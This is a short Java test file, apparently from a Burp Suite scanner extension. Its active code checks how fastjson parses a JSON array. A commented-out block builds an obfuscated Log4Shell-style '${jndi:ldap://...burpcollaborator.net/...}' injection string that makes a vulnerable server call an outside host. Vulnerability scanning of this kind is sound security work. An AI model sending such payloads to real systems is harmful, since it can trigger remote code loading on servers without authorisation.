package burp;

import burp.utils.Utils;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;

import static burp.utils.Utils.confusionChars;

/**
 * @author : p1n93r
 * @date : 2021/12/13 11:38
 */
public class BasicTest {






    public static void main(String[] args) {



//        StringBuilder result = new StringBuilder();
//        result.append(confusionChars(new String[]{"j", "n", "d", "i"}));
//        result.append(":");
//        result.append(confusionChars(new String[]{"l", "d", "a" , "p"}));
//
//        String res = "${" + result.toString() + "://" + "8gpa6fvqgz27m7vxyg8l5kek8be12q.burpcollaborator.net" + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
//
//        System.out.println(res);

        String testJson = "['test','aasdasd']";
        Object parse = JSON.parse(testJson);

        Object parse1 = JSONObject.parse(testJson);
        System.out.println(parse1.getClass());


    }


}
